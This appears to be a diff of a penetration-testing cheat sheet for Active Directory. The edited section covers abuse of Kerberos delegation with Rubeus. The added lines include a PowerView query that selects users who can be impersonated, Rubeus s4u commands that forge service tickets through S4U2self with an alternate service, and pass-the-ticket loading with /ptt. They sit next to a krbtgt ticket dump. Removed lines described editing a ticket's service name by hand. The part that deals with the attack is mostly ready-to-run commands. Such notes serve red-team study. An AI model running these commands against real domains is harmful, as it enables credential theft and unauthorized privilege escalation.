@@ -1833,34 +1833,23 @@ Get-WsusUpdate -Approval Unapproved | Approve-WsusUpdate -Action Install -Target
 .\Rubeus.exe dump /luid:<LUID> /service:krbtgt
 ```
 
+#### Check for user to impersonate
+```
+Get-DomainUser | ? {!($_.memberof -Match "Protected Users")} | select samaccountname, memberof
+```
+
 #### Request TGS
+- Impersonate any user except those in groups "Protected Users" or accounts with the "This account is sensitive and cannot be delegated" right.
+- Make sure they are local admin on the target machine.
 ```
 .\Rubeus.exe s4u /user:<COMPUTERNAME>$ /msdsspn:cifs/<COMPUTER FQDN> /impersonateuser:<USER TO IMPERSONATE> /ticket:<TGT BASE64> /nowrap
+.\Rubeus.exe s4u /impersonateuser:<USER> /self /altservice:cifs/<COMPUTER FQDN> /user:<COMPUTERNAME>$ /ticket:<TGT TICKET> /nowrap
 ```
-
-- S4u2proxy will fail, the s4uself works. Copy the s4u2self base64 string
-
-#### Save it to disk
-```
-[System.IO.File]::WriteAllBytes("C:\Users\public\<USER>.kirbi", [System.Convert]::FromBase64String("<TICKET STRING>"))
-```
-
-#### Get information of the ticket
-```
-.\Rubeus.exe describe /ticket:C:\Users\public\<USER>.kirbi
-```
-
-- The Servicename is not valid for our use - we want it to be for CIFS.  This can be easily changed, because as we saw in the constrained delegation alternate service name demo, the service name is not in the encrypted part of the ticket and is not "checked".
-- Open it in ```Asn1Editor```.  Find the two instances where the GENERAL STRING <COMOTERNAME>$" appears.
-- Double-click them to open the Node Content Editor and replace these strings with "cifs".  We also need to add an additional string node with the FQDN of the machine. Right-click on the parent SEQUENCE and select New.  Enter 1b in the Tag field and click OK.  Double-click on the new node to edit the text.
-- First one should be CIFS, second one the FQDN of the machine.
- 
-![afbeelding](https://user-images.githubusercontent.com/43987245/159697361-dab68723-e4d7-4966-9e6c-fad2f658457b.png)
 
 #### Load the ticket
 ```
-.\Rubeus.exe /ticket:<TICKET BASE64>
-.\Rubeus.exe /ticket:<FILE TO KIRBI FILE>
+.\Rubeus.exe /ticket:<TICKET BASE64> /ptt
+.\Rubeus.exe /ticket:<FILE TO KIRBI FILE> /ptt
 ```
  
 #### Execute ls on the computer
